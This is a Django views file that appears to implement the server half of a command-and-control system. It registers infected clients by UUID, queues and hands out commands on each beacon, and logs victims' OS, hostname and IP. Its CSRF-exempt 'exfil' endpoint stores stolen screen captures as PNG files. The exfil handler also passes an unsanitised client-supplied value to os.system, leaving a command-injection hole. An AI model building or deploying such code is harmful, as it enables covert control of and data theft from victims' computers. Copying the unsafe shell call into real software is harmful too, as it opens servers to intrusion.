from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required
from .models import *
import json
from django.views.decorators.csrf import csrf_exempt
import time
import os
import base64
import time

def clientTest(request):
    return HttpResponse(request.META['REMOTE_ADDR'])

def commands(request, uuid):
    if client.objects.filter(uuid=uuid):
        print("EXISTS")
    else:
        new = client(uuid=uuid)
        new.save()
        new.commands.create(process="UPDATE", arguments="")

    beaconedClient = client.objects.filter(uuid=uuid)[0]
    beaconedClient.lastBeacon = time.time()
    beaconedClient.save()
    try:
        commandResponse = beaconedClient.commands.all()[0]
    except:
        commandResponse = ""
    response_data = {}
    if commandResponse:
        response_data['command'] = commandResponse.process
        response_data['args'] = commandResponse.arguments
        beaconedClient.commands.remove(commandResponse)
        commandResponse.delete()
    else:
        print("NO COMMANDS")
    return HttpResponse(json.dumps(response_data), content_type="application/json")

@csrf_exempt
def update(request):
    uuid = request.POST["UUID"]
    os = request.POST["OS"]
    hostname = request.POST["HOSTNAME"]
    current_client = client.objects.get(uuid=uuid)
    current_client.os = os
    current_client.hostname = hostname
    current_client.ip = request.META['REMOTE_ADDR']
    current_client.lowTime = request.POST["LOW_TIME"]
    current_client.highTime = request.POST["HIGH_TIME"]
    current_client.maxFailts = request.POST["MAX_FAILS"]
    current_client.save()
    return HttpResponse()

@csrf_exempt
def exfil(request):
    exfilData = request.POST["EXFIL_DATA"]
    curTime = time.time()
    try:
        os.mkdir(request.POST["UUID"])
    except:
        pass
    fileName = request.POST["UUID"] + "/" + str(curTime)
    f = open(fileName + ".xwd", "wb")
    f.write(base64.b64decode(exfilData))
    f.close()
    os.system("cat " + fileName + ".xwd | convert xwd:- png:- > " + fileName + ".png")
    os.remove(fileName + ".xwd")
    return HttpResponse()
